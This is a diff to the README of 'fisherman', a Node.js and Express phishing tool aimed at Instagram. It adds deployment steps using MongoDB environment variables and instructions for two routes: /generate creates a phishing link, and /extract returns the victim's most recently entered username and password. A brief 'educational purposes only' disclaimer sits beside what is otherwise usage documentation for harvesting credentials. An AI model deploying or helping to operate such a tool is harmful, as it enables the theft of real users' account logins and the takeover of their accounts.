@@ -1,7 +1,32 @@
-#+TITLE: Fisherman Backend
+#+TITLE: Fisherman
 #+AUTHOR: Pushkar Raj
+#+AUTHOR: px86@protonmail.com
 
-* About
+=fisherman= is a phishing tool created using =Nodejs= and =Express= framework.
 
-=fisherman= is a phishing tool, currently =instagram=.
-This is the backend code for the tool.
+* DISCLAIMER
+
+This tool is meant for *educational purposes only* and should not be used to harm anyone.
+
+Read the LICENSE for more information.
+
+* How to deploy?
+
+If you want to deploy this project without any modifications, you just need to set the following environmental variables, related to your =mongodb= instance:
+
+1. =DB_URI=
+2. =DB_NAME=
+3. =COLLECTION_NAME=
+
+* How to use?
+
+To generate a new phishing link, send a =POST= request at route =/generate=. The POST body must have the =site= field set to the website for which the phishing link is to be generated (_Currently, only =instagram= is supported)_. As a response, a JSON object with the =url= and a =key= is returned.
+
+#+begin_center
+Note: =url= is inappropriately called url, it should be combined with the hostname to produce the full link.
+
+TODO: find a better name for =url=.
+#+end_center
+
+
+Once a victim signs in through the link, any subsequent =POST= requests at =/extract= with the POST body containing the =url= and =key= will return the most recently registered username and password through that link. i.e. repeatedly signing in through the same link will overwrite the previous value for username and password fields.
